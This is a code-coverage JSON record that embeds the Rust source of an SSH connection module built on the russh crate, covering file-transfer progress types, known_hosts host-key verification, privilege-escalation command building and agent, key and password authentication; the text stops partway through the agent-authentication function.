}},{"line":647,"address":[],"length":0,"stats":{"Line":0}},{"line":648,"address":[],"length":0,"stats":{"Line":0}},{"line":649,"address":[],"length":0,"stats":{"Line":0}},{"line":653,"address":[],"length":0,"stats":{"Line":0}},{"line":654,"address":[],"length":0,"stats":{"Line":0}},{"line":655,"address":[],"length":0,"stats":{"Line":0}},{"line":659,"address":[],"length":0,"stats":{"Line":0}},{"line":660,"address":[],"length":0,"stats":{"Line":0}},{"line":661,"address":[],"length":0,"stats":{"Line":0}},{"line":665,"address":[30314048],"length":1,"stats":{"Line":0}},{"line":666,"address":[30314065],"length":1,"stats":{"Line":0}},{"line":667,"address":[30314076],"length":1,"stats":{"Line":0}},{"line":671,"address":[],"length":0,"stats":{"Line":0}},{"line":672,"address":[],"length":0,"stats":{"Line":0}},{"line":673,"address":[],"length":0,"stats":{"Line":0}},{"line":677,"address":[30314001,30313984],"length":1,"stats":{"Line":0}},{"line":679,"address":[31334198,31334088],"length":1,"stats":{"Line":0}},{"line":680,"address":[31334331,31334206],"length":1,"stats":{"Line":0}},{"line":681,"address":[31334353,31334442],"length":1,"stats":{"Line":0}},{"line":683,"address":[31334520],"length":1,"stats":{"Line":0}},{"line":686,"address":[31334557],"length":1,"stats":{"Line":0}},{"line":687,"address":[31334591],"length":1,"stats":{"Line":0}},{"line":688,"address":[31334680],"length":1,"stats":{"Line":0}},{"line":691,"address":[31335091,31335024,31334237],"length":1,"stats":{"Line":0}},{"line":692,"address":[31335074],"length":1,"stats":{"Line":0}},{"line":693,"address":[31335811,31335166,31335596],"length":1,"stats":{"Line":0}},{"line":695,"address":[31335297,31335617],"length":1,"stats":{"Line":0}},{"line":699,"address":[31335263],"length":1,"stats":{"Line":0}},{"line":700,"address":[31335338],"length":1,"stats":{"Line":0}},{"line":701,"address":[31335427],"length":1,"stats":{"Line":0}},{"line":706,"address":[31334857],"length":1,"stats":{"Line":0}},{"line":707,"address":[31335824,31336025],"length":1,"stats":{"Line":0}},{"line":708,"address":[31335842],"length":1,"stats":{"Line":0}},{"line":711,"address":[31335931,31336174],"length":1,"stats":{"Line":0}},{"line":713,"address":[31336206,31336284],"length":1,"stats":{"Line":0}},{"line":714,"address":[31336316],"length":1,"stats":{"Line":0}},{"line":715,"address":[31336394],"length":1,"stats":{"Line":0}},{"line":716,"address":[31336469],"length":1,"stats":{"Line":0}},{"line":720,"address":[31337320],"length":1,"stats":{"Line":0}},{"line":725,"address":[31337342],"length":1,"stats":{"Line":0}},{"line":727,"address":[31337464],"length":1,"stats":{"Line":0}},{"line":728,"address":[31337502],"length":1,"stats":{"Line":0}},{"line":729,"address":[31337634],"length":1,"stats":{"Line":0}},{"line":731,"address":[31337914,31337733,31338093,31338158,31337685,31334177],"length":1,"stats":{"Line":0}},{"line":732,"address":[31338321,31338415],"length":1,"stats":{"Line":0}},{"line":750,"address":[31335961],"length":1,"stats":{"Line":0}},{"line":751,"address":[31337823,31336007],"length":1,"stats":{"Line":0}},{"line":758,"address":[30316208],"length":1,"stats":{"Line":0}},{"line":759,"address":[30316222],"length":1,"stats":{"Line":0}},{"line":760,"address":[30316245],"length":1,"stats":{"Line":0}},{"line":761,"address":[30316265],"length":1,"stats":{"Line":0}}],"covered":22,"coverable":184},{"path":["/","home","artur","Repositories","rustible","src","connection","russh.rs"],"content":"//! Russh connection module\n//!\n//! This module provides SSH connectivity using the russh crate.\n//! Russh is a modern, async-native SSH library that provides better\n//! performance and integration with Tokio compared to ssh2.\n\nuse async_trait::async_trait;\nuse russh::client::{Handle, Handler};\nuse russh::keys::key::PublicKey;\nuse russh::keys::load_secret_key;\nuse russh::ChannelMsg;\nuse russh_keys::agent::client::AgentClient;\nuse russh_sftp::client::SftpSession;\nuse std::path::{Path, PathBuf};\nuse std::sync::atomic::{AtomicBool, Ordering};\nuse std::sync::Arc;\nuse std::time::Duration;\nuse tokio::io::{AsyncReadExt, AsyncWriteExt};\nuse tokio::sync::RwLock;\nuse tracing::{debug, trace, warn};\n\n/// Threshold for using streaming uploads (1MB)\nconst STREAM_THRESHOLD: u64 = 1024 * 1024;\n\n/// Chunk size for streaming transfers (64KB)\nconst CHUNK_SIZE: usize = 64 * 1024;\n\n/// Maximum number of concurrent transfers for batch/directory operations\nconst MAX_CONCURRENT_TRANSFERS: usize = 10;\n\nuse super::config::{\n    default_identity_files, expand_path, ConnectionConfig, HostConfig, RetryConfig,\n};\nuse super::{\n    CommandResult, Connection, ConnectionError, ConnectionResult, ExecuteOptions, FileStat,\n    RusshError, TransferOptions,\n};\n\n// ============================================================================\n// Progress Callback Types for File Transfers\n// ============================================================================\n\n/// Progress information for a file transfer\n#[derive(Debug, Clone)]\npub struct TransferProgress {\n    /// Path of the file being transferred\n    pub path: PathBuf,\n    /// Total size of the file in bytes (0 if unknown)\n    pub total_bytes: u64,\n    /// Number of bytes transferred so far\n    pub transferred_bytes: u64,\n    /// Transfer direction\n    pub direction: TransferDirection,\n    /// Current transfer phase\n    pub phase: TransferPhase,\n}\n\nimpl TransferProgress {\n    /// Create a new transfer progress for upload\n    pub fn upload(path: impl Into\u003cPathBuf\u003e, total_bytes: u64) -\u003e Self {\n        Self {\n            path: path.into(),\n            total_bytes,\n            transferred_bytes: 0,\n            direction: TransferDirection::Upload,\n            phase: TransferPhase::Starting,\n        }\n    }\n\n    /// Create a new transfer progress for download\n    pub fn download(path: impl Into\u003cPathBuf\u003e, total_bytes: u64) -\u003e Self {\n        Self {\n            path: path.into(),\n            total_bytes,\n            transferred_bytes: 0,\n            direction: TransferDirection::Download,\n            phase: TransferPhase::Starting,\n        }\n    }\n\n    /// Get the percentage completed (0-100)\n    pub fn percentage(\u0026self) -\u003e f64 {\n        if self.total_bytes == 0 {\n            0.0\n        } else {\n            (self.transferred_bytes as f64 / self.total_bytes as f64) * 100.0\n        }\n    }\n\n    /// Check if the transfer is complete\n    pub fn is_complete(\u0026self) -\u003e bool {\n        matches!(self.phase, TransferPhase::Completed)\n    }\n\n    /// Update the transferred bytes\n    pub fn update(\u0026mut self, transferred: u64) {\n        self.transferred_bytes = transferred;\n        self.phase = if self.transferred_bytes \u003e= self.total_bytes \u0026\u0026 self.total_bytes \u003e 0 {\n            TransferPhase::Completed\n        } else {\n            TransferPhase::Transferring\n        };\n    }\n}\n\n/// Direction of the transfer\n#[derive(Debug, Clone, Copy, PartialEq, Eq)]\npub enum TransferDirection {\n    Upload,\n    Download,\n}\n\n/// Current phase of the transfer\n#[derive(Debug, Clone, Copy, PartialEq, Eq)]\npub enum TransferPhase {\n    Starting,\n    Transferring,\n    Completed,\n    Finalizing,\n}\n\n/// Callback type for progress updates\npub type ProgressCallback = Arc\u003cdyn Fn(\u0026TransferProgress) + Send + Sync\u003e;\n\n/// Batch progress information for multiple file transfers\n#[derive(Debug, Clone)]\npub struct BatchTransferProgress {\n    /// Total number of files to transfer\n    pub total_files: usize,\n    /// Number of files completed\n    pub completed_files: usize,\n    /// Number of files that succeeded\n    pub successful_files: usize,\n    /// Number of files that failed\n    pub failed_files: usize,\n    /// Total bytes across all files\n    pub total_bytes: u64,\n    /// Bytes transferred so far\n    pub transferred_bytes: u64,\n    /// Current file being transferred\n    pub current_file: Option\u003cTransferProgress\u003e,\n}\n\nimpl BatchTransferProgress {\n    /// Create a new batch progress tracker\n    pub fn new(total_files: usize, total_bytes: u64) -\u003e Self {\n        Self {\n            total_files,\n            completed_files: 0,\n            successful_files: 0,\n            failed_files: 0,\n            total_bytes,\n            transferred_bytes: 0,\n            current_file: None,\n        }\n    }\n\n    /// Get the overall percentage completed\n    pub fn percentage(\u0026self) -\u003e f64 {\n        if self.total_bytes == 0 {\n            if self.total_files == 0 {\n                100.0\n            } else {\n                (self.completed_files as f64 / self.total_files as f64) * 100.0\n            }\n        } else {\n            (self.transferred_bytes as f64 / self.total_bytes as f64) * 100.0\n        }\n    }\n\n    /// Check if the batch is complete\n    pub fn is_complete(\u0026self) -\u003e bool {\n        self.completed_files \u003e= self.total_files\n    }\n}\n\n/// Callback type for batch progress updates\npub type BatchProgressCallback = Arc\u003cdyn Fn(\u0026BatchTransferProgress) + Send + Sync\u003e;\n\n/// Result of a batch transfer operation\n#[derive(Debug)]\npub struct BatchTransferResult {\n    /// Number of successful transfers\n    pub successful: usize,\n    /// Number of failed transfers\n    pub failed: usize,\n    /// Individual results for each file\n    pub results: Vec\u003cSingleTransferResult\u003e,\n}\n\nimpl BatchTransferResult {\n    /// Check if all transfers succeeded\n    pub fn all_succeeded(\u0026self) -\u003e bool {\n        self.failed == 0\n    }\n    /// Get all errors\n    pub fn errors(\u0026self) -\u003e Vec\u003c\u0026ConnectionError\u003e {\n        self.results\n            .iter()\n            .filter_map(|r| r.error.as_ref())\n            .collect()\n    }\n}\n\n/// Result of a single file transfer within a batch\n#[derive(Debug)]\npub struct SingleTransferResult {\n    /// Local path\n    pub local_path: PathBuf,\n    /// Remote path\n    pub remote_path: PathBuf,\n    /// Whether the transfer succeeded\n    pub success: bool,\n    /// Error if the transfer failed\n    pub error: Option\u003cConnectionError\u003e,\n    /// Number of bytes transferred\n    pub bytes_transferred: u64,\n}\n\n/// Options for directory transfer operations\n#[derive(Debug, Clone, Default)]\npub struct DirectoryTransferOptions {\n    /// Base transfer options\n    pub transfer_options: TransferOptions,\n    /// Whether to preserve directory structure\n    pub preserve_structure: bool,\n    /// Whether to follow symbolic links\n    pub follow_symlinks: bool,\n    /// Pattern to exclude files\n    pub exclude_patterns: Vec\u003cString\u003e,\n    /// Pattern to include only matching files\n    pub include_patterns: Vec\u003cString\u003e,\n    /// Maximum recursion depth (None for unlimited)\n    pub max_depth: Option\u003cusize\u003e,\n    /// Number of parallel transfers\n    pub parallelism: Option\u003cusize\u003e,\n}\n\nimpl DirectoryTransferOptions {\n    /// Create new directory transfer options\n    pub fn new() -\u003e Self {\n        Self::default()\n    }\n    /// Set the base transfer options\n    pub fn with_transfer_options(mut self, options: TransferOptions) -\u003e Self {\n        self.transfer_options = options;\n        self\n    }\n    /// Enable/disable preserving directory structure\n    pub fn with_preserve_structure(mut self, preserve: bool) -\u003e Self {\n        self.preserve_structure = preserve;\n        self\n    }\n    /// Enable/disable following symbolic links\n    pub fn with_follow_symlinks(mut self, follow: bool) -\u003e Self {\n        self.follow_symlinks = follow;\n        self\n    }\n    /// Add an exclude pattern\n    pub fn with_exclude(mut self, pattern: impl Into\u003cString\u003e) -\u003e Self {\n        self.exclude_patterns.push(pattern.into());\n        self\n    }\n    /// Add an include pattern\n    pub fn with_include(mut self, pattern: impl Into\u003cString\u003e) -\u003e Self {\n        self.include_patterns.push(pattern.into());\n        self\n    }\n    /// Set maximum recursion depth\n    pub fn with_max_depth(mut self, depth: usize) -\u003e Self {\n        self.max_depth = Some(depth);\n        self\n    }\n    /// Set parallelism level\n    pub fn with_parallelism(mut self, parallelism: usize) -\u003e Self {\n        self.parallelism = Some(parallelism);\n        self\n    }\n    /// Get the effective parallelism\n    pub fn effective_parallelism(\u0026self) -\u003e usize {\n        self.parallelism.unwrap_or(MAX_CONCURRENT_TRANSFERS)\n    }\n}\n\n/// Escape a path for safe use in shell commands\n///\n/// Uses single quotes and escapes any single quotes within the string.\n/// This is the safest way to pass arbitrary paths to shell commands.\nfn escape_shell_arg(s: \u0026str) -\u003e String {\n    format!(\"'{}'\", s.replace('\\'', \"'\\\\''\"))\n}\n\n/// Result of host key verification\n#[derive(Debug, Clone, PartialEq)]\nenum HostKeyStatus {\n    /// Key matches known_hosts entry\n    Verified,\n    /// Host not found in known_hosts (first connection)\n    Unknown,\n    /// Key doesn't match known_hosts entry (potential MITM attack)\n    Mismatch,\n}\n\n/// Client handler for russh with host key verification\nstruct ClientHandler {\n    /// The hostname we're connecting to (for known_hosts lookup)\n    host: String,\n    /// The port we're connecting to\n    port: u16,\n    /// Known hosts entries loaded from ~/.ssh/known_hosts\n    known_hosts: Vec\u003cKnownHostEntry\u003e,\n    /// Whether to accept unknown hosts (first connection)\n    accept_unknown: bool,\n}\n\n/// A parsed entry from known_hosts file\n#[derive(Debug, Clone)]\nstruct KnownHostEntry {\n    /// Hostnames/patterns this entry applies to\n    patterns: Vec\u003cString\u003e,\n    /// The public key\n    key: PublicKey,\n}\n\nimpl ClientHandler {\n    /// Create a new client handler with host key verification\n    fn new(host: \u0026str, port: u16, accept_unknown: bool) -\u003e Self {\n        let known_hosts = Self::load_known_hosts();\n        Self {\n            host: host.to_string(),\n            port,\n            known_hosts,\n            accept_unknown,\n        }\n    }\n\n    /// Load and parse ~/.ssh/known_hosts file\n    fn load_known_hosts() -\u003e Vec\u003cKnownHostEntry\u003e {\n        let mut entries = Vec::new();\n\n        // Get path to known_hosts\n        let known_hosts_path = dirs::home_dir().map(|h| h.join(\".ssh\").join(\"known_hosts\"));\n\n        let path = match known_hosts_path {\n            Some(p) if p.exists() =\u003e p,\n            _ =\u003e return entries,\n        };\n\n        // Read and parse the file\n        let content = match std::fs::read_to_string(\u0026path) {\n            Ok(c) =\u003e c,\n            Err(e) =\u003e {\n                debug!(error = %e, \"Failed to read known_hosts file\");\n                return entries;\n            }\n        };\n\n        for line in content.lines() {\n            let line = line.trim();\n            // Skip empty lines and comments\n            if line.is_empty() || line.starts_with('#') {\n                continue;\n            }\n\n            // Parse the line: hostname[,hostname...] keytype base64key [comment]\n            if let Some(entry) = Self::parse_known_hosts_line(line) {\n                entries.push(entry);\n            }\n        }\n\n        debug!(entry_count = %entries.len(), \"Loaded known_hosts entries\");\n        entries\n    }\n\n    /// Parse a single line from known_hosts\n    fn parse_known_hosts_line(line: \u0026str) -\u003e Option\u003cKnownHostEntry\u003e {\n        let parts: Vec\u003c\u0026str\u003e = line.split_whitespace().collect();\n        if parts.len() \u003c 3 {\n            return None;\n        }\n\n        // First part is comma-separated hostnames/patterns\n        let patterns: Vec\u003cString\u003e = parts[0].split(',').map(|s| s.to_string()).collect();\n\n        // Second and third parts are key type and base64 key\n        let key_type = parts[1];\n        let key_data = parts[2];\n\n        // Decode the base64 key\n        let key_bytes =\n            match base64::Engine::decode(\u0026base64::engine::general_purpose::STANDARD, key_data) {\n                Ok(b) =\u003e b,\n                Err(_) =\u003e return None,\n            };\n\n        // Parse the public key\n        // The key format is: 4-byte length + key type string + key data\n        let key = match russh::keys::key::parse_public_key(\u0026key_bytes, None) {\n            Ok(k) =\u003e k,\n            Err(_) =\u003e {\n                // Try alternative parsing based on key type\n                trace!(key_type = %key_type, \"Failed to parse key, skipping entry\");\n                return None;\n            }\n        };\n\n        Some(KnownHostEntry { patterns, key })\n    }\n\n    /// Check if a pattern matches the host\n    fn pattern_matches(pattern: \u0026str, host: \u0026str, port: u16) -\u003e bool {\n        // Handle [host]:port format\n        if pattern.starts_with('[') {\n            if let Some(end_bracket) = pattern.find(']') {\n                let pattern_host = \u0026pattern[1..end_bracket];\n                let pattern_port = pattern\n                    .get(end_bracket + 2..)\n                    .and_then(|p| p.parse::\u003cu16\u003e().ok())\n                    .unwrap_or(22);\n                return pattern_host == host \u0026\u0026 pattern_port == port;\n            }\n        }\n\n        // Simple hostname match (port 22 implied)\n        if port == 22 \u0026\u0026 pattern == host {\n            return true;\n        }\n\n        // Wildcard matching\n        if pattern.contains('*') || pattern.contains('?') {\n            return Self::wildcard_match(pattern, host);\n        }\n\n        false\n    }\n\n    /// Simple wildcard matching for known_hosts patterns\n    fn wildcard_match(pattern: \u0026str, text: \u0026str) -\u003e bool {\n        let mut pattern_chars = pattern.chars().peekable();\n        let mut text_chars = text.chars().peekable();\n\n        while let Some(pc) = pattern_chars.next() {\n            match pc {\n                '*' =\u003e {\n                    // * matches zero or more characters\n                    if pattern_chars.peek().is_none() {\n                        return true; // trailing * matches everything\n                    }\n                    // Try matching rest of pattern at each position\n                    let rest_pattern: String = pattern_chars.collect();\n                    let rest_text: String = text_chars.collect();\n                    for i in 0..=rest_text.len() {\n                        if Self::wildcard_match(\u0026rest_pattern, \u0026rest_text[i..]) {\n                            return true;\n                        }\n                    }\n                    return false;\n                }\n                '?' =\u003e {\n                    // ? matches exactly one character\n                    if text_chars.next().is_none() {\n                        return false;\n                    }\n                }\n                c =\u003e {\n                    if text_chars.next() != Some(c) {\n                        return false;\n                    }\n                }\n            }\n        }\n\n        text_chars.next().is_none()\n    }\n\n    /// Verify a server key against known_hosts\n    fn verify_host_key(\u0026self, server_key: \u0026PublicKey) -\u003e HostKeyStatus {\n        for entry in \u0026self.known_hosts {\n            for pattern in \u0026entry.patterns {\n                if Self::pattern_matches(pattern, \u0026self.host, self.port) {\n                    // Found a matching host entry - compare keys\n                    if Self::keys_equal(\u0026entry.key, server_key) {\n                        return HostKeyStatus::Verified;\n                    }\n                    // Key mismatch - potential MITM attack\n                    warn!(\n                        host = %self.host,\n                        \"Host key mismatch! The server's key differs from known_hosts\"\n                    );\n                    return HostKeyStatus::Mismatch;\n                }\n            }\n        }\n\n        // Host not found in known_hosts\n        HostKeyStatus::Unknown\n    }\n\n    /// Compare two public keys for equality\n    fn keys_equal(a: \u0026PublicKey, b: \u0026PublicKey) -\u003e bool {\n        // Compare the key fingerprints\n        a.fingerprint() == b.fingerprint()\n    }\n}\n\n#[async_trait]\nimpl Handler for ClientHandler {\n    type Error = RusshError;\n\n    async fn check_server_key(\n        \u0026mut self,\n        server_public_key: \u0026PublicKey,\n    ) -\u003e Result\u003cbool, Self::Error\u003e {\n        match self.verify_host_key(server_public_key) {\n            HostKeyStatus::Verified =\u003e {\n                debug!(host = %self.host, \"Host key verified against known_hosts\");\n                Ok(true)\n            }\n            HostKeyStatus::Unknown =\u003e {\n                if self.accept_unknown {\n                    warn!(\n                        host = %self.host,\n                        \"Host not found in known_hosts, accepting (first connection)\"\n                    );\n                    // TODO: Optionally add to known_hosts file\n                    Ok(true)\n                } else {\n                    warn!(\n                        host = %self.host,\n                        \"Host not found in known_hosts, rejecting\"\n                    );\n                    Ok(false)\n                }\n            }\n            HostKeyStatus::Mismatch =\u003e {\n                // This is a security issue - key has changed\n                warn!(\n                    host = %self.host,\n                    \"HOST KEY VERIFICATION FAILED! Server key does not match known_hosts entry.\"\n                );\n                Ok(false)\n            }\n        }\n    }\n}\n\n/// Russh connection implementation using russh crate\n///\n/// This implementation uses RwLock instead of Mutex for the handle to reduce\n/// lock contention during parallel operations. Most operations only need read\n/// access to get a reference to the Handle for opening channels - only close()\n/// needs write access to take ownership of the handle.\npub struct RusshConnection {\n    /// Session identifier\n    identifier: String,\n    /// Russh client handle - uses RwLock for better parallel performance\n    /// Read lock: channel operations (execute, upload, download, etc.)\n    /// Write lock: close operation only\n    handle: Arc\u003cRwLock\u003cOption\u003cHandle\u003cClientHandler\u003e\u003e\u003e\u003e,\n    /// Host configuration (kept for future connection pooling improvements)\n    #[allow(dead_code)]\n    host_config: HostConfig,\n    /// Whether the connection is established\n    connected: Arc\u003cAtomicBool\u003e,\n}\n\nimpl RusshConnection {\n    /// Build command string with options (no environment variables)\n    fn build_command(command: \u0026str, options: \u0026ExecuteOptions) -\u003e String {\n        let mut parts = Vec::new();\n\n        // Add working directory\n        if let Some(cwd) = \u0026options.cwd {\n            parts.push(format!(\"cd {} \u0026\u0026 \", cwd));\n        }\n\n        // Handle privilege escalation\n        if options.escalate {\n            let escalate_method = options.escalate_method.as_deref().unwrap_or(\"sudo\");\n            let escalate_user = options.escalate_user.as_deref().unwrap_or(\"root\");\n\n            match escalate_method {\n                \"sudo\" =\u003e {\n                    if options.escalate_password.is_some() {\n                        parts.push(format!(\"sudo -S -u {} -- \", escalate_user));\n                    } else {\n                        parts.push(format!(\"sudo -u {} -- \", escalate_user));\n                    }\n                }\n                \"su\" =\u003e {\n                    parts.push(format!(\"su - {} -c \", escalate_user));\n                }\n                \"doas\" =\u003e {\n                    parts.push(format!(\"doas -u {} \", escalate_user));\n                }\n                _ =\u003e {\n                    parts.push(format!(\"sudo -u {} -- \", escalate_user));\n                }\n            }\n        }\n\n        parts.push(command.to_string());\n        parts.concat()\n    }\n\n    /// Build command string with options, including environment variables\n    ///\n    /// Since russh doesn't support the SSH request_env protocol, we prepend\n    /// environment variable exports to the command.\n    fn build_command_with_env(command: \u0026str, options: \u0026ExecuteOptions) -\u003e String {\n        let mut parts = Vec::new();\n\n        // Prepend environment variables as exports\n        if !options.env.is_empty() {\n            for (key, value) in \u0026options.env {\n                // Use export to set environment variables\n                // Escape the value to handle special characters\n                let escaped_value = value.replace('\\'', \"'\\\\''\");\n                parts.push(format!(\"export {}='{}'; \", key, escaped_value));\n            }\n        }\n\n        // Add the rest of the command using the base build_command\n        parts.push(Self::build_command(command, options));\n        parts.concat()\n    }\n\n    /// Open an SFTP session\n    async fn open_sftp(handle: \u0026Handle\u003cClientHandler\u003e) -\u003e ConnectionResult\u003cSftpSession\u003e {\n        let channel = handle.channel_open_session().await.map_err(|e| {\n            ConnectionError::TransferFailed(format!(\"Failed to open channel: {}\", e))\n        })?;\n\n        channel.request_subsystem(true, \"sftp\").await.map_err(|e| {\n            ConnectionError::TransferFailed(format!(\"Failed to request SFTP subsystem: {}\", e))\n        })?;\n\n        SftpSession::new(channel.into_stream()).await.map_err(|e| {\n            ConnectionError::TransferFailed(format!(\"Failed to create SFTP session: {}\", e))\n        })\n    }\n\n    /// Create remote directories recursively via SFTP\n    async fn create_remote_dirs_sftp(sftp: \u0026SftpSession, path: \u0026Path) -\u003e ConnectionResult\u003c()\u003e {\n        let mut current = PathBuf::new();\n\n        for component in path.components() {\n            current.push(component);\n\n            // Skip root\n            if current.to_string_lossy() == \"/\" {\n                continue;\n            }\n\n            // Try to create directory (ignore error if it already exists)\n            let _ = sftp.create_dir(current.to_string_lossy().to_string()).await;\n        }\n\n        Ok(())\n    }\n}\n\nimpl RusshConnection {\n    /// Connect to a remote host via SSH using russh\n    pub async fn connect(\n        host: \u0026str,\n        port: u16,\n        user: \u0026str,\n        host_config: Option\u003cHostConfig\u003e,\n        global_config: \u0026ConnectionConfig,\n    ) -\u003e ConnectionResult\u003cSelf\u003e {\n        let host_config = host_config.unwrap_or_else(|| global_config.get_host_merged(host));\n        let retry_config = host_config.retry_config();\n\n        let actual_host = host_config.hostname.as_deref().unwrap_or(host);\n        let actual_port = host_config.port.unwrap_or(port);\n        let actual_user = host_config.user.as_deref().unwrap_or(user);\n        let timeout = host_config.timeout_duration();\n\n        debug!(\n            host = %actual_host,\n            port = %actual_port,\n            user = %actual_user,\n            \"Connecting via SSH (russh)\"\n        );\n\n        let identifier = format!(\"{}@{}:{}\", actual_user, actual_host, actual_port);\n\n        // Connect with retry logic\n        let handle = Self::connect_with_retry(\n            actual_host,\n            actual_port,\n            actual_user,\n            \u0026host_config,\n            global_config,\n            timeout,\n            \u0026retry_config,\n        )\n        .await?;\n\n        Ok(Self {\n            identifier,\n            handle: Arc::new(RwLock::new(Some(handle))),\n            host_config,\n            connected: Arc::new(AtomicBool::new(true)),\n        })\n    }\n\n    /// Connect with retry logic\n    async fn connect_with_retry(\n        host: \u0026str,\n        port: u16,\n        user: \u0026str,\n        host_config: \u0026HostConfig,\n        global_config: \u0026ConnectionConfig,\n        timeout: Duration,\n        retry_config: \u0026RetryConfig,\n    ) -\u003e ConnectionResult\u003cHandle\u003cClientHandler\u003e\u003e {\n        let mut last_error = None;\n\n        for attempt in 0..=retry_config.max_retries {\n            if attempt \u003e 0 {\n                let delay = retry_config.delay_for_attempt(attempt - 1);\n                debug!(attempt = %attempt, delay = ?delay, \"Retrying SSH connection\");\n                tokio::time::sleep(delay).await;\n            }\n\n            match Self::do_connect(host, port, user, host_config, global_config, timeout).await {\n                Ok(handle) =\u003e return Ok(handle),\n                Err(e) =\u003e {\n                    warn!(attempt = %attempt, error = %e, \"SSH connection attempt failed\");\n                    last_error = Some(e);\n                }\n            }\n        }\n\n        Err(last_error.unwrap_or_else(|| {\n            ConnectionError::ConnectionFailed(\"Unknown connection error\".to_string())\n        }))\n    }\n\n    /// Perform the actual connection\n    async fn do_connect(\n        host: \u0026str,\n        port: u16,\n        user: \u0026str,\n        host_config: \u0026HostConfig,\n        global_config: \u0026ConnectionConfig,\n        timeout: Duration,\n    ) -\u003e ConnectionResult\u003cHandle\u003cClientHandler\u003e\u003e {\n        // Create optimized russh client configuration\n        let mut config = russh::client::Config::default();\n        config.inactivity_timeout = Some(timeout);\n        // Optimize preferred algorithms for faster negotiation\n        // Modern servers typically support these fast algorithms\n        config.preferred = russh::Preferred {\n            // Prefer fast key exchange algorithms\n            kex: std::borrow::Cow::Borrowed(\u0026[\n                russh::kex::CURVE25519,\n                russh::kex::CURVE25519_PRE_RFC_8731,\n            ]),\n            // Prefer fast ciphers (only use AES-256-GCM as AES-128-GCM isn't available)\n            cipher: std::borrow::Cow::Borrowed(\u0026[\n                russh::cipher::CHACHA20_POLY1305,\n                russh::cipher::AES_256_GCM,\n            ]),\n            // Prefer fast key types\n            key: std::borrow::Cow::Borrowed(\u0026[\n                russh::keys::key::ED25519,\n                russh::keys::key::RSA_SHA2_256,\n                russh::keys::key::RSA_SHA2_512,\n            ]),\n            // Prefer fast MACs (not used with AEAD ciphers but needed for fallback)\n            mac: std::borrow::Cow::Borrowed(\u0026[russh::mac::HMAC_SHA256, russh::mac::HMAC_SHA512]),\n            // No compression for speed\n            compression: std::borrow::Cow::Borrowed(\u0026[russh::compression::NONE]),\n        };\n        let config = Arc::new(config);\n\n        // Connect to the SSH server\n        let addr = format!(\"{}:{}\", host, port);\n        let socket = tokio::time::timeout(timeout, tokio::net::TcpStream::connect(\u0026addr))\n            .await\n            .map_err(|_| ConnectionError::Timeout(timeout.as_secs()))?\n            .map_err(|e| {\n                ConnectionError::ConnectionFailed(format!(\"Failed to connect to {}: {}\", addr, e))\n            })?;\n\n        // Enable TCP_NODELAY for lower latency\n        socket.set_nodelay(true).map_err(|e| {\n            ConnectionError::ConnectionFailed(format!(\"Failed to set TCP_NODELAY: {}\", e))\n        })?;\n\n        // Create client handler with host key verification\n        // Accept unknown hosts by default (like StrictHostKeyChecking=accept-new)\n        let handler = ClientHandler::new(host, port, true);\n\n        let mut session = russh::client::connect_stream(config, socket, handler)\n            .await\n            .map_err(|e| {\n                ConnectionError::ConnectionFailed(format!(\"SSH handshake failed: {}\", e))\n            })?;\n\n        // Authenticate\n        Self::authenticate(\u0026mut session, user, host_config, global_config).await?;\n\n        debug!(\"SSH connection established successfully\");\n        Ok(session)\n    }\n\n    /// Perform SSH authentication\n    async fn authenticate(\n        session: \u0026mut Handle\u003cClientHandler\u003e,\n        user: \u0026str,\n        host_config: \u0026HostConfig,\n        global_config: \u0026ConnectionConfig,\n    ) -\u003e ConnectionResult\u003c()\u003e {\n        // Try SSH agent first if enabled\n        if global_config.defaults.use_agent {\n            if Self::try_agent_auth(session, user).await.is_ok() {\n                debug!(\"Authenticated using SSH agent\");\n                return Ok(());\n            }\n        }\n\n        // Try key-based authentication\n        // 1. Try specific identity file if configured\n        if let Some(identity_file) = \u0026host_config.identity_file {\n            let key_path = expand_path(identity_file);\n            if Self::try_key_auth(session, user, \u0026key_path, host_config.password.as_deref())\n                .await\n                .is_ok()\n            {\n                debug!(key = %key_path.display(), \"Authenticated using key\");\n                return Ok(());\n            }\n        }\n\n        // 2. Try default identity files from global config\n        for identity_file in \u0026global_config.defaults.identity_files {\n            let key_path = expand_path(identity_file);\n            if Self::try_key_auth(session, user, \u0026key_path, host_config.password.as_deref())\n                .await\n                .is_ok()\n            {\n                debug!(key = %key_path.display(), \"Authenticated using key\");\n                return Ok(());\n            }\n        }\n\n        // 3. Try default identity files from ~/.ssh/\n        for key_path in default_identity_files() {\n            if Self::try_key_auth(session, user, \u0026key_path, host_config.password.as_deref())\n                .await\n                .is_ok()\n            {\n                debug!(key = %key_path.display(), \"Authenticated using key\");\n                return Ok(());\n            }\n        }\n\n        // Try password authentication\n        if let Some(password) = \u0026host_config.password {\n            let authenticated = session\n                .authenticate_password(user, password)\n                .await\n                .map_err(|e| {\n                    ConnectionError::AuthenticationFailed(format!(\n                        \"Password authentication failed: {}\",\n                        e\n                    ))\n                })?;\n\n            if authenticated {\n                debug!(\"Authenticated using password\");\n                return Ok(());\n            }\n        }\n\n        Err(ConnectionError::AuthenticationFailed(\n            \"All authentication methods failed\".to_string(),\n        ))\n    }\n\n    /// Try SSH agent authentication\n    ///\n    /// Connects to the SSH agent via SSH_AUTH_SOCK environment variable,\n    /// retrieves available identities, and attempts authentication with each.\n    async fn try_agent_auth(\n        session: \u0026mut Handle\u003cClientHandler\u003e,\n        user: \u0026str,\n    ) -\u003e ConnectionResult\u003c()\u003e {\n        // Connect to SSH agent using SSH_AUTH_SOCK environment variable\n        let mut agent = AgentClient::connect_env().await.map_err(|e| {\n            ConnectionError::AuthenticationFailed(format!(\"Failed to connect to SSH agent: {}\", e))\n        })?;\n\n        // Get available identities from the agent\n        let identities = agent.request_identities().await.map_err(|e| {\n            ConnectionError::AuthenticationFailed(format!(\"Failed to get agent identities: {}\", e))\n        })?;\n\n        if identities.is_empty() {\n            return Err(ConnectionError::AuthenticationFailed(\n                \"SSH agent has no identities\".to_string(),\n            ));\n        }\n\n        debug!(identity_count = %identities.len(), \"Found SSH agent identities\");\n\n        // Try each identity until one works\n        for identity in identities {\n            trace!(\"Trying SSH agent identity\");\n\n            // Use authenticate_future which accepts a Signer trait (russh 0.45 API)\n            // AgentClient implements Signer\n            let (returned_agent, result) = session\n                .authenticate_future(user, identity.clone(), agent)\n                .await;\n            agent = returned_agent;\n\n            match result {\n                Ok(true) =\u003e {\n                    debug!(\"SSH agent authentication successful\");\n                    return Ok(());\n                }\n                Ok(false) =\u003e {\n                    // Key was rejected, try the next one\n                    trace!(\"Identity rejected, trying next\");\n                }\n                Err(e) =\u003e {\n                    // Log the error but continue trying other keys\n                    trace!(error = %e, \"Agent 